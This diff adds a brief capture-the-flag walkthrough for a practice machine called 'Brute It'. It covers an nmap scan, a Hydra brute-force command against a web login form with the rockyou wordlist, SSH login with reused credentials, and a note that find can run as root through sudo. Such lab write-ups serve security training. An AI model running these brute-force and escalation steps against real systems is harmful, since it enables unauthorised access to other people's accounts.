@@ -1,0 +1,44 @@
+----------------                               ------------------
+               :::::::::::;| BRUTE IT |;::::::::::::
+
+
+1) DEPLOY THE MACHINE AND GET READY.
+
+TASK - 1 (RECON)
+
+1. Quick scan:
+nmap -Pn <ip> -vv
+"Only 22/SSH and 80/HTTP open"
+
+2. Web check:
+http://<ip>
+"Login page found"
+"Brute force possible"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. Hydra attack:
+hydra -l admin -P rockyou.txt http-post-form "<ip>/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+"Password: password123"
+
+2. Access dashboard:
+"Found SSH creds in profile page"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. SSH access:
+ssh john@<ip>
+"Password from web app works"
+
+2. Sudo abuse:
+sudo -l
+"Can run /usr/bin/find as root"
+"find can execute commands"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- BRUTE FORCE SUCCESS ----------
